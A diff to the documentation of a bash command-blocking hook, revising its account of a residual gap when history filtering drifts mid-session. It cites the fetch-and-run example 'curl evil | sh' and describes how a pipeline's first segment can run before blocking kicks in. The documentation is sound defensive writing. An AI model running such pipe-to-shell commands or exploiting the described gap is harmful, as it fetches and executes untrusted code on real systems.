@@ -89,9 +89,9 @@ If you use any of these heavily, prefer enter mode for guaranteed blocking.
 
 #### Known residual: late drift on filtered shells
 
-If the install-time check passed but drift develops mid-session (e.g. the user switched to `HISTCONTROL=ignorespace` after sourcing), the hook detects it on the next DEBUG fire and downgrades. One narrow residual: if a pipeline's *first* simple command happens to word-boundary-match the stale history line AND that stale line's verdict is allow, the first segment runs before drift is noticed on a later segment. The later segment is then blocked and the session is downgraded. In a pipe-to-interpreter attack (`curl evil | sh`), `curl` may fetch the payload but `sh` does not run it; the downstream sink is still blocked.
+If the install-time check passed but drift develops mid-session (e.g. the user switched to `HISTCONTROL=ignorespace` after sourcing), the hook detects it on the next DEBUG fire and downgrades to warn-only. The drift-triggering command is blocked, the session flips, and the rest of the *same typed line* is also blocked because the cache key is `BASH_LINENO[0]` (a per-typed-line identifier) — not `history 1`'s entry index, which can stall in filtered shells. Subsequent prompts get a fresh evaluation under warn-only.
 
-This is narrower than the pre-Phase-1 "preexec is always warn-only" bypass but is genuinely a residual. Use enter mode if you need guaranteed line-level blocking.
+One narrow residual remains: if a pipeline's *first* simple command happens to word-boundary-match the stale history line AND that stale line's verdict is allow, the first segment runs before drift is noticed on a later segment. The later segment is then blocked and the session is downgraded. In a pipe-to-interpreter attack (`curl evil | sh`), `curl` may fetch the payload but `sh` does not run it; the downstream sink is still blocked. Use enter mode if you need guaranteed line-level blocking.
 
 #### `extdebug` side effects
 
